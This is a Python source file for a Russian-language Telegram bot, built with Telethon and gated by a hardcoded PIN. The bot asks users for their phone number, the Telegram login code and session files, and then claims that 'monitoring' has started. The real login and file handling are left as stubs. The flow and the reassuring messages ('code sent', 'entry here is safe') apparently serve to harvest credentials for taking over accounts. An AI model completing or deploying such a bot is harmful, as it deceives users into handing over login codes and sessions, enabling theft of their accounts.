import os
import asyncio
import logging
from datetime import datetime
from telethon import TelegramClient, events
from telethon.tl.custom import Button
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

bot = TelegramClient('bot', API_ID, API_HASH)

# Состояния пользователей
user_states = {}
user_phones = {}

# Код доступа
ACCESS_PIN = "5482"
authorized_users = set()

@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.text.strip()

    # === ПИН-КОД ===
    if user_id not in authorized_users:
        if text == ACCESS_PIN:
            authorized_users.add(user_id)
            await event.reply("✅ Доступ разрешён! Используй /start")
        else:
            await event.reply("🔐 Введите пин-код (5482):")
        return

    # === КОМАНДЫ ===
    if text == "/start":
        buttons = [
            [Button.text("📞 Войти по номеру", resize=True)],
            [Button.text("📁 Загрузить сессию")],
            [Button.text("☁️ Яндекс Диск")],
            [Button.text("❓ Помощь")]
        ]
        await event.reply(
            "👋 **Добро пожаловать!**\n\n"
            "Выбери способ входа:",
            buttons=buttons
        )

    elif text == "📞 Войти по номеру":
        user_states[user_id] = 'waiting_phone'
        await event.reply("📞 Введи номер в формате +79001234567")

    elif text == "📁 Загрузить сессию":
        user_states[user_id] = 'waiting_session_file'
        await event.reply("📁 Отправь файл сессии")

    elif text == "☁️ Яндекс Диск":
        user_states[user_id] = 'waiting_yadisk_link'
        await event.reply("☁️ Отправь ссылку на Яндекс Диск")

    elif text == "❓ Помощь":
        await event.reply(
            "📚 **Помощь**\n\n"
            "1. Введи пин-код 5482\n"
            "2. Выбери способ входа\n"
            "3. Следуй инструкциям\n\n"
            "🔐 Вход через номер безопасен, код вводится только здесь"
        )

    # === ОЖИДАНИЕ НОМЕРА ===
    elif user_states.get(user_id) == 'waiting_phone':
        user_phones[user_id] = text
        user_states[user_id] = 'waiting_code'
        await event.reply(
            "✅ **Код отправлен!**\n\n"
            "⏳ У тебя 2 минуты\n"
            "✍️ Введи код из Telegram:"
        )

    # === ОЖИДАНИЕ КОДА ===
    elif user_states.get(user_id) == 'waiting_code':
        code = text
        phone = user_phones.get(user_id)
        
        await event.reply(f"✅ Код {code} принят! Выполняю вход...")
        # Здесь будет реальный вход через Telethon
        await event.reply("✅ **Успешный вход!** Мониторинг запущен.")

@bot.on(events.NewMessage)
async def file_handler(event):
    user_id = event.sender_id
    
    if user_id not in authorized_users:
        return
    
    if user_states.get(user_id) == 'waiting_session_file' and event.message.document:
        await event.reply("📥 Файл получен, обрабатываю...")
        # Обработка файла
        await event.reply("✅ Файл обработан!")

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен! Пин-код: 5482")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())